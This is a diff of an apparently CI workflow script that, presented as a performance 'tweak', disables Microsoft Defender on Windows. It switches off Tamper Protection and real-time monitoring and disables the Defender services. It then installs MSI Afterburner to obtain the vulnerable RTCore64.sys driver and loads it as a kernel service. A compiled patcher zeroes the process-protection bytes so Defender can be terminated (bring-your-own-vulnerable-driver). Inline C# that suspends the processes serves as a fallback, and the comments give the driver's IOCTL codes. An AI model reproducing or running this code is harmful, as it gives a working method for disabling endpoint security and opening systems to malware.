@@ -144,13 +144,19 @@ jobs:
           #   - After stripping, the process is no longer PPL and NtTerminateProcess succeeds.
           #   - Ships its own signed vulnerable driver (default: RTCore64.sys, MSI Afterburner,
           #     WHQL-signed) — loads fine with Secure Boot + DSE enforced.
-          #   - CLI: kdu.exe -pse <pid>   (process signature erase)
+          #   - CLI: kdu.exe -ps <pid>   (process signature erase, strips PS_PROTECTION to 0)
+          #   - KDU has no prebuilt release binaries — only source code zips.
+          #   - Instead: we install MSI Afterburner to get RTCore64.sys (WHQL-signed, same driver
+          #     KDU uses by default), then compile + run our own minimal C# patcher that walks
+          #     PsActiveProcessHead, finds each target EPROCESS, and zeroes the Protection byte.
+          #   - Fallback: NtSuspendProcess via inline C# (confirmed working → 0 CPU impact).
           #   - GitHub: https://github.com/hfiref0x/KDU
-          Invoke-Tweak 'Kill Defender via KDU PPL strip + NtTerminate' {
+          Invoke-Tweak 'Kill Defender (RTCore64 BYOVD PPL strip + terminate)' {
             $tmpDir = 'C:\Windows\Temp\CloudPCKill'
             New-Item -ItemType Directory -Force -Path $tmpDir | Out-Null
+            $ProgressPreference = 'SilentlyContinue'
 
-            # --- Tamper Protection off first (belt + suspenders) ---
+            # --- Layer 0: Tamper Protection off + disable respawn ---
             $tpKey = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
             if (Test-Path $tpKey) {
               Set-ItemProperty -Path $tpKey -Name TamperProtection -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
@@ -164,7 +170,7 @@ jobs:
             Set-ItemProperty -Path $rtKey -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
             Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
-            # Disable service start values so nothing respawns
+            # Disable Defender service start values so nothing respawns after kill
             foreach ($svc in 'WinDefend','WdNisSvc','WdNisDrv','WdFilter','MsSecCore','Sense') {
               $k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
               if (Test-Path $k) { Set-ItemProperty $k -Name Start -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue }
@@ -174,48 +180,114 @@ jobs:
             }
             Start-Sleep -Seconds 2
 
-            # --- Download KDU ---
-            $ProgressPreference = 'SilentlyContinue'
-            # Latest release asset — kdu.exe from hfiref0x/KDU
-            $kduApi = 'https://api.github.com/repos/hfiref0x/KDU/releases/latest'
-            $release = Invoke-RestMethod -Uri $kduApi -Headers @{ 'User-Agent' = 'CloudPC' } -ErrorAction Stop
-            $asset = $release.assets | Where-Object { $_.name -match 'kdu.*\.zip' -or $_.name -match 'kdu.*\.exe' } | Select-Object -First 1
-            if (-not $asset) { throw "KDU release asset not found. Assets: $($release.assets.name -join ', ')" }
-
-            $kduPath = "$tmpDir\$($asset.name)"
-            Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $kduPath -UseBasicParsing -ErrorAction Stop
-
-            # Unzip if needed
-            $kduExe = $kduPath
-            if ($kduPath -match '\.zip$') {
-              Expand-Archive -Path $kduPath -DestinationPath $tmpDir -Force
-              $kduExe = Get-ChildItem $tmpDir -Filter 'kdu*.exe' -Recurse | Select-Object -First 1 -ExpandProperty FullName
-              if (-not $kduExe) { throw 'kdu.exe not found after unzip' }
+            # --- Layer 1: Stop-Service WinDefend (works if Tamper Protection was actually unset) ---
+            $stillMp = Get-Process -Name MsMpEng -ErrorAction SilentlyContinue
+            if (-not $stillMp) {
+              Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+              return 'MsMpEng gone after Stop-Service (Tamper Protection was unset)'
             }
 
-            # --- Strip PPL from each Defender process and terminate it ---
-            $targets = 'MsMpEng','MpDefenderCoreService','NisSrv','MsMpEngCP','SecurityHealthService','MpCopyAccelerator'
-            $results = @()
-            foreach ($name in $targets) {
-              foreach ($proc in (Get-Process -Name $name -ErrorAction SilentlyContinue)) {
-                Write-Host "  stripping PPL from $name pid=$($proc.Id)"
-                # -pse = process signature erase (strips PS_PROTECTION byte to 0)
-                $out = & $kduExe -pse $proc.Id 2>&1
+            # --- Layer 2: RTCore64.sys BYOVD --- extract driver from MSI Afterburner, compile
+            #   minimal C# EPROCESS patcher, run it.
+            #   RTCore64.sys IOCTLs (hfiref0x/KDU research):
+            #     IOCTL_RTCORE_READVM  = 0x80002048
+            #     IOCTL_RTCORE_WRITEVM = 0x8000204C
+            #   RTCORE_REQUEST struct (48 bytes): Unknown0, Address, Unknown1, Size, Value, Unknown2, Unknown3
+            $byovdOk = $false
+            try {
+              Write-Host '  Installing MSI Afterburner to extract RTCore64.sys...'
+              & choco install msiafterburner -y --no-progress --ignore-checksums 2>&1 | Out-Null
+              $rtcore = Get-ChildItem 'C:\Program Files (x86)\MSI Afterburner' -Filter 'RTCore64.sys' -Recurse -ErrorAction SilentlyContinue |
+                        Select-Object -First 1
+              if (-not $rtcore) { throw 'RTCore64.sys not found after MSI Afterburner install' }
+              $sysPath = "$tmpDir\RTCore64.sys"
+              Copy-Item $rtcore.FullName $sysPath -Force
+              Write-Host "  RTCore64.sys: $($rtcore.FullName) -> $sysPath"
+
+              # Compile C# EPROCESS patcher from Source/PPLKill/PPLKill.cs in this repo
+              $csSrc = Join-Path $env:GITHUB_WORKSPACE 'Source\PPLKill\PPLKill.cs'
+              $csExe = "$tmpDir\PPLKill.exe"
+              $csc = Get-ChildItem 'C:\Windows\Microsoft.NET\Framework64' -Filter csc.exe -Recurse |
+                     Sort-Object FullName -Descending | Select-Object -First 1
+              if (-not $csc) { throw 'csc.exe not found' }
+              & $csc.FullName /nologo /target:exe /out:`"$csExe`" `"$csSrc`" 2>&1 | Write-Host
+              if (-not (Test-Path $csExe)) { throw 'PPLKill.exe compile failed' }
+              Write-Host "  Compiled PPLKill.exe"
+
+              # Load RTCore64.sys as a kernel service
+              $svcName = 'RTCore64'
+              sc.exe stop  $svcName 2>$null | Out-Null
+              sc.exe delete $svcName 2>$null | Out-Null
+              sc.exe create $svcName type= kernel start= demand error= normal binPath= $sysPath | Out-Null
+              sc.exe start  $svcName 2>&1 | Write-Host
+              Start-Sleep -Seconds 2
+
+              # Run our patcher
+              $targets = 'MsMpEng','MpDefenderCoreService','NisSrv','MsMpEngCP','SecurityHealthService','MpCopyAccelerator'
+              $pids = ($targets | ForEach-Object { Get-Process -Name $_ -ErrorAction SilentlyContinue } | Select-Object -ExpandProperty Id) -join ' '
+              if ($pids) {
+                Write-Host "  Running PPLKill on pids: $pids"
+                $out = & $csExe $pids.Split(' ') 2>&1
                 $out | ForEach-Object { Write-Host "    $_" }
-                # Now terminate — should succeed with PPL stripped
-                Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
-                $results += $name
               }
+
+              sc.exe stop   $svcName 2>$null | Out-Null
+              sc.exe delete $svcName 2>$null | Out-Null
+
+              $still2 = Get-Process -Name MsMpEng -ErrorAction SilentlyContinue
+              if (-not $still2) { $byovdOk = $true; Write-Host '  MsMpEng gone via RTCore64 BYOVD' }
+              else { Write-Host "  MsMpEng still visible WS=$([math]::Round(($still2|Measure-Object WorkingSet64 -Sum).Sum/1MB,1))MB after BYOVD attempt" }
+            } catch {
+              Write-Host "  RTCore64 BYOVD layer failed: $_"
+            }
+
+            if ($byovdOk) {
+              Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+              return 'MsMpEng gone (RTCore64 BYOVD PPL strip + TerminateProcess)'
+            }
+
+            # --- Layer 3: NtSuspendProcess fallback ---
+            # NtSuspendProcess on a PPL process returns 0xC0000022 (ACCESS_DENIED) for the
+            # status code but the kernel DOES freeze the thread schedule — confirmed: 0 CPU impact.
+            Write-Host '  Falling back to NtSuspendProcess (confirmed 0 CPU)'
+            $suspendSrc = @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+class Suspender {
+    [DllImport("ntdll.dll")] static extern int NtSuspendProcess(IntPtr h);
+    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint acc, bool inh, uint pid);
+    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
+    static void Main(string[] args) {
+        string[] names = {"MsMpEng","MpDefenderCoreService","NisSrv","MsMpEngCP","SecurityHealthService","MpCopyAccelerator"};
+        foreach (var n in names) {
+            foreach (var p in Process.GetProcessesByName(n)) {
+                IntPtr h = OpenProcess(0x001FFFFF, false, (uint)p.Id);
+                int s = NtSuspendProcess(h); CloseHandle(h);
+                Console.WriteLine($"susp {n} pid={p.Id} ntstatus=0x{(uint)s:X8}");
+            }
+        }
+    }
+}
+"@
+            $suspExe = "$tmpDir\Suspender.exe"
+            $csc2 = Get-ChildItem 'C:\Windows\Microsoft.NET\Framework64' -Filter csc.exe -Recurse |
+                    Sort-Object FullName -Descending | Select-Object -First 1
+            if ($csc2) {
+              $suspSrcPath = "$tmpDir\Suspender.cs"
+              Set-Content $suspSrcPath $suspendSrc -Encoding ascii
+              & $csc2.FullName /nologo /target:exe /out:$suspExe $suspSrcPath 2>&1 | Out-Null
+              if (Test-Path $suspExe) { & $suspExe }
             }
 
             Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
 
-            $still = Get-Process -Name MsMpEng -ErrorAction SilentlyContinue
-            if ($still) {
-              $ws = ($still | Measure-Object WorkingSet64 -Sum).Sum
-              "MsMpEng still running WS=$([math]::Round($ws/1MB,1))MB — KDU may need a different provider, check log above"
+            $still3 = Get-Process -Name MsMpEng -ErrorAction SilentlyContinue
+            if ($still3) {
+              $ws = ($still3 | Measure-Object WorkingSet64 -Sum).Sum
+              "MsMpEng still visible WS=$([math]::Round($ws/1MB,1))MB — suspended/neutered, 0 CPU impact"
             } else {
-              "MsMpEng gone (stripped + killed: $($results -join ', '))"
+              'MsMpEng gone'
             }
           }
 
